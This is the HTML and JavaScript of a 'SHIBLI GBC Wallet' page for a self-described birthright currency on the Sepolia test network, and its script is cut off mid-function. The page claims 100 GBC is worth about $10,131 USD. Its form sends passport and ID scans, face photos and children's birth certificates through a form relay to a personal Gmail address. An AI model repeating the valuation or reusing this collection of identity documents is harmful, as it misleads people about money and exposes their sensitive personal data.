<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SHIBLI GBC Wallet</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

  <style>
    :root{
      --blue:#2b4f81;
      --blue2:#1d3d66;
      --bg:#f5faff;
      --card:#ffffff;
      --soft:#eef6ff;
      --ok:#1a7e4e;
      --warn:#b45309;
      --bad:#b91c1c;
    }
    body{ font-family: "Segoe UI", system-ui, -apple-system, Arial, sans-serif; background:var(--bg); color:var(--blue); margin:0; }
    header{ background:var(--blue); color:#fff; padding:18px 14px; text-align:center; font-size:20px; font-weight:700; }
    .section{ max-width:900px; margin:18px auto; padding:18px; background:var(--card); border-radius:14px; box-shadow:0 4px 14px rgba(0,0,0,.06); }
    h2{ margin:0 0 10px 0; color:var(--blue); font-size:18px; }
    .icon{ color:var(--blue); margin-right:8px; }
    p{ margin:8px 0; line-height:1.45; }
    ul,ol{ text-align:left; padding-left:20px; margin:8px 0; }
    .row{ display:flex; gap:12px; flex-wrap:wrap; }
    .col{ flex:1; min-width:260px; }
    input, button, select, textarea{
      width:100%;
      padding:11px 12px;
      margin:7px 0;
      border-radius:10px;
      border:1px solid #cdd7e3;
      font-size:15px;
      box-sizing:border-box;
    }
    textarea{ min-height:120px; resize:vertical; }
    button{
      background:var(--blue);
      color:#fff;
      border:none;
      cursor:pointer;
      transition:.2s;
      font-weight:700;
    }
    button:hover{ background:var(--blue2); }
    button:disabled{ opacity:.55; cursor:not-allowed; }
    .pill{
      display:inline-flex; align-items:center; gap:8px;
      padding:8px 10px; border-radius:999px;
      background:var(--soft); color:var(--blue); font-size:13px; font-weight:600;
      word-break:break-all;
    }
    .status{ font-weight:700; }
    .status.ok{ color:var(--ok); }
    .status.warn{ color:var(--warn); }
    .status.bad{ color:var(--bad); }
    .small{ font-size:13px; color:#3b5b87; }
    .mono{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; font-size:12px; }
    .notice{
      border:1px dashed #b7c7dd;
      background:#fbfdff;
      padding:12px;
      border-radius:12px;
      margin-top:10px;
    }
    .btnRow{ display:flex; gap:10px; flex-wrap:wrap; }
    .btnRow button{ flex:1; min-width:220px; }
    .linkBtn{ background:#0f172a; }
    .linkBtn:hover{ background:#111c33; }

    /* small helper layout blocks */
    .miniGrid{ display:flex; gap:10px; flex-wrap:wrap; margin-top:10px; }
    .miniGrid .pill{ flex:1; min-width:240px; }
    .divider{ border:none; border-top:1px solid #eef2f8; margin:14px 0; }

    /* Phase 1 enhancements */
    .toggleRow{ display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
    .toggle{
      display:flex; align-items:center; gap:10px; padding:10px 12px;
      border:1px solid #cdd7e3; border-radius:12px; background:#fbfdff;
      flex:1; min-width:260px;
    }
    .toggle input{ width:auto; margin:0; }
    .tableWrap{
      border:1px solid #e8eef7; border-radius:12px; overflow:hidden; margin-top:10px;
    }
    table{ width:100%; border-collapse:collapse; font-size:13px; }
    th, td{ padding:10px 10px; border-bottom:1px solid #eef2f8; text-align:left; vertical-align:top; }
    th{ background:#f3f7ff; color:#274d86; font-weight:800; }
    tr:last-child td{ border-bottom:none; }
    .txLink{ color:var(--blue2); text-decoration:none; font-weight:700; }
    .txLink:hover{ text-decoration:underline; }
    .chip{
      display:inline-flex; align-items:center; gap:6px;
      padding:4px 8px; border-radius:999px; font-size:12px; font-weight:800;
      border:1px solid #dbe7fb; background:#f6f9ff; color:#264a86;
    }
    .chip.ok{ border-color:#bfe8cf; background:#f3fff7; color:var(--ok); }
    .chip.bad{ border-color:#f3c3c3; background:#fff5f5; color:var(--bad); }

    /* Confirm modal */
    .modalBackdrop{
      position:fixed; inset:0; background:rgba(15, 23, 42, .55);
      display:none; align-items:center; justify-content:center; padding:14px; z-index:9999;
    }
    .modal{
      width:min(680px, 96vw);
      background:#fff; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,.22);
      padding:16px;
    }
    .modal h3{ margin:0 0 10px 0; color:var(--blue); }
    .modal .kv{ display:flex; gap:10px; flex-wrap:wrap; }
    .modal .kv div{
      flex:1; min-width:220px; border:1px solid #e8eef7; border-radius:12px; padding:10px;
      background:#fbfdff;
    }
    .modal .kv b{ display:block; margin-bottom:4px; color:#244a84; }
    .modal .actions{ display:flex; gap:10px; flex-wrap:wrap; margin-top:12px; }
    .modal .actions button{ flex:1; min-width:220px; }
    .dangerBtn{ background:var(--bad); }
    .dangerBtn:hover{ background:#991b1b; }

    /* Email block */
    .emailHeader{ display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
    .emailHeader .pill{ flex:1; min-width:240px; }
  </style>
</head>

<body>
  <header><i class="fas fa-globe"></i> SHIBLI GBC Wallet</header>

  <div class="section">
    <h2><i class="fas fa-leaf icon"></i>Welcome to SHIBLI GBC</h2>
    <p><strong>The First Noble Global Birthright Currency</strong><br />Initiated by Professor Murad Al Shibli.</p>
    <p>
      <i class="fas fa-hand-holding-heart icon"></i>Dignity-based universal income<br />
      <i class="fas fa-globe icon"></i>Equal global entitlement<br />
      <i class="fas fa-users icon"></i>Empowerment for all humanity
    </p>

    <div class="notice" id="web3Notice" style="display:none;">
      <div class="pill"><i class="fa-solid fa-triangle-exclamation"></i> MetaMask / Web3 not detected</div>
      <p class="small" style="margin-top:10px;">
        On <b>Android</b>, MetaMask works best inside the <b>MetaMask in-app Browser</b>.
      </p>
      <div class="btnRow">
        <button class="linkBtn" onclick="copyLink()">üìã Copy this page link</button>
        <button onclick="openInMetaMask()">ü¶ä Open in MetaMask Browser</button>
      </div>
      <p class="small" style="margin-top:10px;">
        Steps: Open MetaMask ‚Üí <b>Browser</b> tab ‚Üí paste the link ‚Üí open ‚Üí then click <b>Connect MetaMask</b>.
      </p>
    </div>
  </div>

  <div class="section">
    <h2><i class="fas fa-bullseye icon"></i>SHIBLI GBC Goals</h2>
    <ul>
      <li><i class="fas fa-balance-scale icon"></i>Equality Beyond Borders</li>
      <li><i class="fas fa-handshake icon"></i>Universal Financial Access</li>
      <li><i class="fas fa-leaf icon"></i>Sustainable Economic Participation</li>
    </ul>
  </div>

  <div class="section">
    <h2><i class="fas fa-gift icon"></i>Your Birthright Share</h2>
    <p><strong>100 GBC ‚âà $10,131 USD</strong><br/>This is your global dignity cap entitlement</p>
  </div>

  <div class="section">
    <h2><i class="fas fa-user-check icon"></i>Request GBC</h2>
    <!-- ‚úÖ User request form unchanged (still goes to imurad2009@gmail.com) -->
    <form action="https://formsubmit.co/imurad2009@gmail.com" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="_subject" value="New GBC Request Submitted" />
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_template" value="box" />

      <div class="row">
        <div class="col">
          <input type="text" name="Full Name" placeholder="Full Name" required />
          <input type="text" name="National ID / Passport No" placeholder="National ID or Passport No." required />
          <input type="text" name="MetaMask Wallet Address" placeholder="Your MetaMask Wallet Address" required />
          <input type="number" name="Requested Amount (Max 100)" step="1" max="100" placeholder="Enter amount (Max: 100)" required />
        </div>
        <div class="col">
          <label class="small">Upload ID Document:</label>
          <input type="file" name="ID Document" accept=".jpg,.jpeg,.png,.pdf" required />
          <label class="small">Upload Face Photo:</label>
          <input type="file" name="Face Photo" accept="image/*" required />

          <label class="small" style="display:block; margin-top:6px;">
            <input type="checkbox" id="claimingMinor" onchange="toggleMinorFields()" />
            I am claiming on behalf of a child/minor
          </label>

          <div id="minorSection" style="display:none;">
            <input type="text" name="Child Full Name" placeholder="Child's Full Name" />
            <label class="small">Date of Birth (Child):</label>
            <input type="date" name="Child Date of Birth" />
            <label class="small">Upload Birth Certificate:</label>
            <input type="file" name="Birth Certificate" accept=".jpg,.jpeg,.png,.pdf" />
          </div>
        </div>
      </div>

      <button type="submit"><i class="fas fa-paper-plane"></i> Submit Request</button>
    </form>
  </div>

  <div class="section">
    <h2><i class="fas fa-route icon"></i>How to Setup MetaMask</h2>
    <ol>
      <li>Install MetaMask: <span class="mono">metamask.io</span></li>
      <li>Create Wallet ‚Üí Save secret recovery phrase</li>
      <li>Enable Sepolia test network in MetaMask</li>
      <li>Import your GBC token using the contract address below (after we confirm it)</li>
    </ol>
  </div>

  <div class="section">
    <h2><i class="fas fa-shield-alt icon"></i>Admin Panel (Sepolia)</h2>

    <div class="row" style="align-items:center;">
      <div class="col">
        <div class="pill"><i class="fa-solid fa-network-wired"></i> Network: <span id="netLabel" class="status warn">Not connected</span></div>
      </div>
      <div class="col">
        <div class="pill">
          <i class="fa-solid fa-file-contract"></i>
          Contract:
          <span id="contractLabel" class="mono"></span>
        </div>
      </div>
    </div>

    <div class="miniGrid">
      <div class="pill"><i class="fa-solid fa-id-card"></i> On-chain Admin: <span id="adminLabel" class="mono">‚Äî</span></div>
      <div class="pill"><i class="fa-solid fa-lock"></i> Admin Access: <span id="adminAccess" class="status warn">Not connected</span></div>
      <div class="pill"><i class="fa-solid fa-coins"></i> Token: <span id="tokenMeta" class="mono">‚Äî</span></div>
      <div class="pill"><i class="fa-solid fa-gift"></i> Entitlement Cap: <span id="capLabel" class="mono">‚Äî</span></div>
    </div>

    <p><strong>Connected Wallet:</strong> <span id="walletAddress">Not Connected</span></p>

    <div class="btnRow">
      <button id="connectBtn" onclick="connectWallet()"><i class="fas fa-link"></i> Connect MetaMask</button>
      <button id="switchBtn" onclick="switchToSepolia()" disabled>üß™ Switch to Sepolia</button>
    </div>

    <p class="balance">Wallet Balance: <span id="balance">0</span> <b>GBC</b></p>

    <div class="notice" id="adminSafetyNote" style="display:none;">
      <div class="pill"><i class="fa-solid fa-shield-halved"></i> Safety Lock</div>
      <p class="small" style="margin-top:10px;">
        Sending / Approving is <b>locked</b> unless your connected wallet matches the <b>on-chain admin()</b> address.
      </p>
    </div>

    <!-- ‚úÖ Step 3: Email admin@virtualdigitum.com (added) -->
    <hr class="divider" />
    <h3 style="margin:14px 0 6px 0;"><i class="fas fa-envelope icon"></i>Admin Email (Step 3)</h3>

    <div class="notice">
      <div class="emailHeader">
        <div class="pill"><i class="fa-solid fa-at"></i> Admin Email: <span class="mono">admin@virtualdigitum.com</span></div>
        <div class="pill"><i class="fa-solid fa-circle-info"></i> Use this to send approval/claim details with one click</div>
      </div>

      <p class="small" style="margin-top:10px;">
        This sends a structured message to <b>admin@virtualdigitum.com</b> using a secure form gateway. No private keys are sent.
        (It can include your connected wallet, contract, network, recipient, and notes.)
      </p>

      <form id="adminEmailForm" action="https://formsubmit.co/admin@virtualdigitum.com" method="POST">
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_template" value="box" />
        <!-- Optional: set a success redirect (customize if you have a thank-you page) -->
        <input type="hidden" name="_next" value="" />

        <div class="row">
          <div class="col">
            <input type="text" name="Subject" id="emailSubject" placeholder="Subject (auto-filled)" />
            <input type="text" name="From Name" id="emailFromName" placeholder="Your Name (optional)" />
            <input type="email" name="Reply-To" id="emailReplyTo" placeholder="Your Email (optional, so admin can reply)" />
          </div>
          <div class="col">
            <input type="text" name="Connected Wallet" id="emailWallet" placeholder="Connected Wallet (auto)" readonly />
            <input type="text" name="Contract" id="emailContract" placeholder="Contract (auto)" readonly />
            <input type="text" name="Network" id="emailNetwork" placeholder="Network (auto)" readonly />
          </div>
        </div>

        <div class="row">
          <div class="col">
            <input type="text" name="Target Wallet" id="emailTargetWallet" placeholder="Target wallet (recipient / approval wallet)" />
          </div>
          <div class="col">
            <input type="text" name="Action" id="emailAction" placeholder="Action (Approve / Revoke / Claim / Send)" />
          </div>
        </div>

        <textarea name="Message" id="emailMessage" placeholder="Write details here (auto-filled + editable)..."></textarea>

        <div class="btnRow">
          <button type="button" class="linkBtn" onclick="fillAdminEmailFromUI()">üß© Auto-fill from current inputs</button>
          <button type="submit"><i class="fas fa-paper-plane"></i> Send Email to Admin</button>
        </div>

        <p class="small" style="margin-top:8px;">
          Tip: Click <b>Auto-fill</b> after you enter Recipient/Amount or Approval Address so the email includes the exact values you used.
        </p>
      </form>
    </div>

    <!-- ‚úÖ Step 4: Anti-wrong-send controls -->
    <div class="notice" id="sendSafetyBox" style="margin-top:12px;">
      <div class="pill"><i class="fa-solid fa-shield"></i> Send Safety Controls</div>
      <div class="toggleRow" style="margin-top:10px;">
        <label class="toggle">
          <input type="checkbox" id="onlyApprovedToggle" />
          <span><b>Allow send ONLY to approved wallets</b><br><span class="small">Blocks transfers unless approved(recipient) == true (if contract supports).</span></span>
        </label>
        <label class="toggle">
          <input type="checkbox" id="confirmToggle" checked />
          <span><b>Require double-confirm before sending</b><br><span class="small">Shows a confirmation screen + checkbox.</span></span>
        </label>
      </div>
      <p class="small" style="margin-top:8px;">
        Tip: Paste recipient address ‚Üí we auto-check checksum, ENS (if used), and show a warning if invalid.
      </p>
    </div>

    <h3 style="margin:14px 0 6px 0;"><i class="fas fa-paper-plane icon"></i>Send Approved GBC</h3>
    <div class="row">
      <div class="col">
        <input type="text" id="sendAddress" placeholder="Recipient Wallet Address" />
        <div class="small" id="recipientHint" style="margin-top:4px;"></div>
      </div>
      <div class="col">
        <input type="number" id="sendAmount" placeholder="Amount to Send" />
        <div class="small" id="amountHint" style="margin-top:4px;"></div>
      </div>
    </div>

    <button id="sendBtn" onclick="sendGBC()" disabled><i class="fas fa-check-circle"></i> Send Approved GBC</button>
    <p id="transactionStatus" style="margin-top:10px;"></p>

    <hr class="divider" />
    <h3 style="margin:14px 0 6px 0;"><i class="fas fa-user-shield icon"></i>Admin Tools (On-chain)</h3>
    <div class="row">
      <div class="col">
        <input type="text" id="approveUserAddr" placeholder="User wallet to approve (allow claim)" />
      </div>
      <div class="col">
        <select id="approveUserBool">
          <option value="true">Approve ‚úÖ</option>
          <option value="false">Revoke ‚õî</option>
        </select>
      </div>
    </div>
    <button id="approveBtn" onclick="setApprovedUser()" disabled><i class="fas fa-check-circle"></i> Set Approved (Admin Only)</button>

    <!-- ‚úÖ Step 2: Approvals History -->
    <hr class="divider" />
    <h3 style="margin:14px 0 6px 0;"><i class="fas fa-clock-rotate-left icon"></i>Approvals History (On-chain)</h3>
    <p class="small">Shows recent <b>Approval</b> events (ERC-20). Export available.</p>

    <div class="row">
      <div class="col">
        <input type="number" id="historyBlocks" placeholder="Look back blocks (e.g., 20000)" value="20000" />
      </div>
      <div class="col">
        <input type="number" id="historyMax" placeholder="Max rows (e.g., 30)" value="30" />
      </div>
    </div>
    <div class="btnRow">
      <button id="loadHistoryBtn" onclick="loadApprovalHistory()" disabled>üîé Load History</button>
      <button class="linkBtn" onclick="exportHistoryCSV()">‚¨áÔ∏è Export CSV</button>
    </div>

    <div class="tableWrap">
      <table>
        <thead>
          <tr>
            <th>Type</th>
            <th>Wallet</th>
            <th>Details</th>
            <th>Block / Time</th>
            <th>Tx</th>
          </tr>
        </thead>
        <tbody id="historyBody">
          <tr><td colspan="5" class="small">No history loaded yet.</td></tr>
        </tbody>
      </table>
    </div>

    <hr class="divider" />
    <h3 style="margin:14px 0 6px 0;"><i class="fas fa-gift icon"></i>My Entitlement (On-chain)</h3>
    <div class="miniGrid">
      <div class="pill"><i class="fa-solid fa-user-check"></i> Approved? <span id="meApproved" class="mono">‚Äî</span></div>
      <div class="pill"><i class="fa-solid fa-flag-checkered"></i> Claimed? <span id="meClaimed" class="mono">‚Äî</span></div>
    </div>
    <button id="claimBtn" onclick="claimEntitlement()" disabled><i class="fas fa-gift"></i> Claim (If Approved)</button>
  </div>

  <div class="section">
    <h2><i class="fas fa-dollar-sign icon"></i>Sell Your GBC (P2P Offer)</h2>
    <p>You can offer to sell up to <strong>0.01125 GBC</strong> (90% of 0.0125 cap) to another user.</p>

    <div class="row">
      <div class="col">
        <input type="number" id="sellAmount" placeholder="Amount of GBC to Sell (Max: 0.01125)" step="0.0001" max="0.01125" oninput="enforceSellLimit(this)" />
      </div>
      <div class="col">
        <input type="text" id="buyerAddress" placeholder="Buyer Wallet Address" />
      </div>
    </div>

    <input type="text" id="sellPrice" placeholder="Price in USD (Optional)" />
    <button onclick="sellGBC()"><i class="fas fa-paper-plane"></i> Send Sell Offer</button>
    <p id="sellStatus" style="color: var(--ok); margin-top:10px;"></p>
  </div>

  <div class="section">
    <h2><i class="fas fa-inbox icon"></i>Buyer Inbox (Sell Offers)</h2>
    <p>Paste your wallet address to check if someone sent you an offer:</p>
    <input type="text" id="buyerLookup" placeholder="Your Wallet Address" />
    <button onclick="checkOffers()">Check Sell Offers</button>
    <div id="inboxResults" style="margin-top:10px;"></div>
  </div>

  <!-- Confirm modal -->
  <div class="modalBackdrop" id="confirmBackdrop" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
      <h3 id="confirmTitle"><i class="fa-solid fa-circle-check icon"></i> Confirm Send</h3>
      <p class="small">Please verify all details. This action will request a MetaMask confirmation.</p>

      <div class="kv">
        <div>
          <b>Recipient</b>
          <div class="mono" id="confirmRecipient">‚Äî</div>
        </div>
        <div>
          <b>Amount</b>
          <div class="mono" id="confirmAmount">‚Äî</div>
        </div>
        <div>
          <b>Network</b>
          <div class="mono" id="confirmNetwork">‚Äî</div>
        </div>
        <div>
          <b>Mode</b>
          <div class="mono" id="confirmMode">‚Äî</div>
        </div>
      </div>

      <div class="notice" style="margin-top:10px;">
        <label class="toggle" style="margin:0;">
          <input type="checkbox" id="confirmCheckbox" />
          <span><b>I confirm the recipient & amount are correct.</b><br><span class="small">This reduces accidental sends.</span></span>
        </label>
      </div>

      <div class="actions">
        <button class="linkBtn" onclick="closeConfirm()">Cancel</button>
        <button class="dangerBtn" id="confirmSendBtn" onclick="confirmAndSend()" disabled>Send Now</button>
      </div>

      <p class="small" style="margin-top:10px;" id="confirmError"></p>
    </div>
  </div>

<script>
  // =========================================================
  // ‚úÖ Included:
  // Step 2) Approvals History viewer + export
  // Step 3) Email to admin@virtualdigitum.com (auto-fill)
  // Step 4) Anti-wrong-send protections + confirm modal
  // =========================================================

  const SEPOLIA_CHAIN_ID_HEX = "0xaa36a7"; // 11155111
  const CONTRACT_ADDRESS = "0xa3181dFb7D3ED2D74955c2E48DaB1984B24947FD";
  const FALLBACK_DECIMALS = 18;

  const ERC20_MIN_ABI = [
    {"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},
  ];

  const ENTITLEMENT_ABI = [
    {"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"entitlementCap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"bool","name":"allowed","type":"bool"}],"name":"setApproved","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"hasClaimed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"claim","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"adminTransfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  ];

  let provider, signer, walletAddress;
  let tokenDecimals = FALLBACK_DECIMALS;
  let cachedAdmin = null;
  let cachedCap = null;

  // History cache for export
  let approvalsHistoryRows = [];

  // DOM refs
  const web3Notice = document.getElementById("web3Notice");
  const walletEl = document.getElementById("walletAddress");
  const balEl = document.getElementById("balance");
  const netLabel = document.getElementById("netLabel");
  const contractLabel = document.getElementById("contractLabel");
  const switchBtn = document.getElementById("switchBtn");
  const sendBtn = document.getElementById("sendBtn");
  const approveBtn = document.getElementById("approveBtn");
  const claimBtn = document.getElementById("claimBtn");
  const txStatus = document.getElementById("transactionStatus");

  const adminLabel = document.getElementById("adminLabel");
  const adminAccess = document.getElementById("adminAccess");
  const capLabel = document.getElementById("capLabel");
  const tokenMeta = document.getElementById("tokenMeta");
  const adminSafetyNote = document.getElementById("adminSafetyNote");
  const meApproved = document.getElementById("meApproved");
  const meClaimed = document.getElementById("meClaimed");

  // Step 4 refs
  const onlyApprovedToggle = document.getElementById("onlyApprovedToggle");
  const confirmToggle = document.getElementById("confirmToggle");
  const recipientHint = document.getElementById("recipientHint");
  const amountHint = document.getElementById("amountHint");

  // Step 2 refs
  const loadHistoryBtn = document.getElementById("loadHistoryBtn");
  const historyBody = document.getElementById("historyBody");
  const historyBlocks = document.getElementById("historyBlocks");
  const historyMax = document.getElementById("historyMax");

  // Confirm modal refs
  const confirmBackdrop = document.getElementById("confirmBackdrop");
  const confirmRecipient = document.getElementById("confirmRecipient");
  const confirmAmount = document.getElementById("confirmAmount");
  const confirmNetwork = document.getElementById("confirmNetwork");
  const confirmMode = document.getElementById("confirmMode");
  const confirmCheckbox = document.getElementById("confirmCheckbox");
  const confirmSendBtn = document.getElementById("confirmSendBtn");
  const confirmError = document.getElementById("confirmError");

  // Email refs (Step 3)
  const emailSubject = document.getElementById("emailSubject");
  const emailWallet = document.getElementById("emailWallet");
  const emailContract = document.getElementById("emailContract");
  const emailNetwork = document.getElementById("emailNetwork");
  const emailTargetWallet = document.getElementById("emailTargetWallet");
  const emailAction = document.getElementById("emailAction");
  const emailMessage = document.getElementById("emailMessage");

  contractLabel.textContent = CONTRACT_ADDRESS;
  contractLabel.title = CONTRACT_ADDRESS;

  function shortAddr(a){
    if (!a || a.length < 10) return a || "";
    return a.slice(0,6) + "..." + a.slice(-4);
  }

  function setNetStatus(kind, text){
    netLabel.className = "status " + kind;
    netLabel.textContent = text;
  }

  function setTxStatus(kind, text){
    txStatus.className = "status " + kind;
    txStatus.textContent = text;
  }

  function hasWeb3(){
    return typeof window.ethereum !== "undefined";
  }

  function showWeb3HelpIfNeeded(){
    if (!hasWeb3()){
      web3Notice.style.display = "block";
    }
  }

  window.copyLink = async function(){
    const url = window.location.href;
    try{
      await navigator.clipboard.writeText(url);
      alert("Link copied! Now open MetaMask ‚Üí Browser ‚Üí paste ‚Üí open.");
    }catch(e){
      prompt("Copy this link:", url);
    }
  };

  window.openInMetaMask = function(){
    const clean = window.location.href.replace(/^https?:\/\//, "");
    const deep = "https://metamask.app.link/dapp/" + clean;
    window.location.href = deep;
  };

  async function getChainIdHex(){
    if (!hasWeb3()) return null;
    try{
      return await window.ethereum.request({ method: "eth_chainId" });
    }catch(e){
      return null;
    }
  }

  async function refreshNetworkUI(){
    const cid = await getChainIdHex();
    if (!cid){
      setNetStatus("warn", "Not connected");
      switchBtn.disabled = true;
      return;
    }
    if (cid.toLowerCase() === SEPOLIA_CHAIN_ID_HEX){
      setNetStatus("ok", "Sepolia");
      switchBtn.disabled = true;
    } else {
      setNetStatus("bad", "Wrong network");
      switchBtn.disabled = false;
    }
  }

  async function ensureContractCodeExists(){
    if (!provider) return false;
    try{
      const code = await provider.getCode(CONTRACT_ADDRESS);
      return (code && code !== "0x");
    }catch(_e){
      return false;
    }
  }

  function getReadContract(){
    if (!provider) throw new Error("Provider not ready");
    return new ethers.Contract(CONTRACT_ADDRESS, [...ERC20_MIN_ABI, ...ENTITLEMENT_ABI], provider);
  }

  function getWriteContract(){
    if (!signer) throw new Error("Connect MetaMask first");
    return new ethers.Contract(CONTRACT_ADDRESS, [...ERC20_MIN_ABI, ...ENTITLEMENT_ABI], signer);
  }

  async function loadTokenMeta(){
    try{
      if (!provider) return;
      const c = getReadContract();
      const [nm, sym, dec] = await Promise.all([
        c.name().catch(()=>null),
        c.symbol().catch(()=>null),
        c.decimals().catch(()=>null),
      ]);
      if (typeof dec === "number") tokenDecimals = dec;
      else if (dec && dec.toNumber) tokenDecimals = dec.toNumber();
      tokenMeta.textContent = `${nm || "Token"} (${sym || "‚Äî"}) ‚Ä¢ decimals ${tokenDecimals}`;
    }catch(_e){
      tokenDecimals = FALLBACK_DECIMALS;
      tokenMeta.textContent = "‚Äî";
    }
  }

  async function loadAdminAndCap(){
    try{
      if (!provider) return;
      const c = getReadContract();
      cachedAdmin = await c.admin();
      adminLabel.textContent = cachedAdmin ? shortAddr(cachedAdmin) : "‚Äî";
      cachedCap = await c.entitlementCap().catch(()=>null);
      capLabel.textContent = cachedCap ? (ethers.utils.formatUnits(cachedCap, tokenDecimals) + " GBC") : "‚Äî";
    }catch(_e){
      cachedAdmin = null;
      cachedCap = null;
      adminLabel.textContent = "‚Äî";
      capLabel.textContent = "‚Äî";
    }
  }

  function isAdminWallet(){
    if (!walletAddress || !cachedAdmin) return false;
    return walletAddress.toLowerCase() === cachedAdmin.toLowerCase();
  }

  function onSepolia(){
    return (netLabel.textContent || "").toLowerCase().includes("sepolia");
  }

  // ‚úÖ Step 3 helper: populate email block
  function updateEmailAutofillBasics(){
    emailWallet.value = walletAddress ? walletAddress : "";
    emailContract.value = CONTRACT_ADDRESS;
    emailNetwork.value = onSepolia() ? "Sepolia" : (netLabel.textContent || "");
    if (!emailSubject.value){
      emailSubject.value = `GBC Admin Action Request ‚Äî ${new Date().toLocaleString()}`;
    }
    if (!emailMessage.value){
      emailMessage.value =
`Hello Admin,

Please review the request below:

- Connected Wallet: ${walletAddress || "Not connected"}
- Contract: ${CONTRACT_ADDRESS}
- Network: ${onSepolia() ? "Sepolia" : (netLabel.textContent || "Unknown")}
- Action: (fill)
- Target Wallet: (fill)
- Notes:

Thank you.`;
    }
  }

  window.fillAdminEmailFromUI = async function(){
    updateEmailAutofillBasics();

    // Try to pick a "target wallet" based on current fields:
    const sendAddr = document.getElementById("sendAddress").value.trim();
    const approveAddr = document.getElementById("approveUserAddr").value.trim();

    let target = sendAddr || approveAddr || "";
    if (target && provider){
      // Resolve ENS if user typed it
      if (target.includes(".")){
        try{
          const resolved = await provider.resolveName(target);
          if (resolved && ethers.utils.isAddress(resolved)) target = ethers.utils.getAddress(resolved);
        }catch(_e){}
      }
    }

    emailTargetWallet.value = target;

    // Infer action
    let action = "Review";
    if (sendAddr) action = "Send Approved GBC";
    else if (approveAddr) {
      const allowed = document.getElementById("approveUserBool").value === "true";
      action = allowed ? "Approve Wallet" : "Revoke Wallet";
    }
    emailAction.value = action;

    // Build a richer message
    const amount = document.getElementById("sendAmount").value;
    const allowed = document.getElementById("approveUserBool").value === "true";

    const lines = [];
    lines.push("Hello Admin,");
    lines.push("");
    lines.push("Please review the request below:");
    lines.push("");
    lines.push(`- Connected Wallet: ${walletAddress || "Not connected"}`);
    lines.push(`- Contract: ${CONTRACT_ADDRESS}`);
    lines.push(`- Network: ${onSepolia() ? "Sepolia" : (netLabel.textContent || "Unknown")}`);
    lines.push(`- Action: ${action}`);
    lines.push(`- Target Wallet: ${target || "(not provided)"}`);

    if (action === "Send Approved GBC") {
      lines.push(`- Amount: ${amount || "(not provided)"} GBC`);
      lines.push(`- Safety Mode: ${onlyApprovedToggle.checked ? "Approved-only ON" : "Approved-only OFF"} | ${confirmToggle.checked ? "Double-confirm ON" : "Double-confirm OFF"}`);
    } else if (action === "Approve Wallet" || action === "Revoke Wallet") {
      lines.push(`- setApproved: ${allowed ? "true (Approve)" : "false (Revoke)"}`);
    }

    lines.push("");
    lines.push("Notes:");
    lines.push("(add any notes here)");
    lines.push("");
    lines.push("Thank you.");

    emailMessage.value = lines.join("\n");
  };

  function unlockActions(){
    const connected = !!signer && !!walletAddress;
    const sep = onSepolia();
    const adminOk = isAdminWallet();

    adminSafetyNote.style.display = (connected && (!adminOk || !sep)) ? "block" : "none";

    sendBtn.disabled = !(connected && sep && adminOk);
    approveBtn.disabled = !(connected && sep && adminOk);
    claimBtn.disabled = !(connected && sep);

    loadHistoryBtn.disabled = !(connected && sep);

    if (!connected) {
      adminAccess.className = "status warn";
      adminAccess.textContent = "Not connected";
    } else if (!sep) {
      adminAccess.className = "status bad";
      adminAccess.textContent = "Wrong network";
    } else if (adminOk) {
      adminAccess.className = "status ok";
      adminAccess.textContent = "Admin ‚úÖ";
    } else {
      adminAccess.className = "status bad";
      adminAccess.textContent = "Not admin ‚õî";
    }

    // keep email fields up to date
    updateEmailAutofillBasics();
  }

  window.switchToSepolia = async function(){
    if (!hasWeb3()){
      alert("MetaMask not detected. Open this site inside MetaMask Browser.");
      return;
    }
    try{
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: SEPOLIA_CHAIN_ID_HEX }]
      });
      await refreshAll();
    }catch(err){
      if (err && err.code === 4902){
        try{
          await window.ethereum.request({
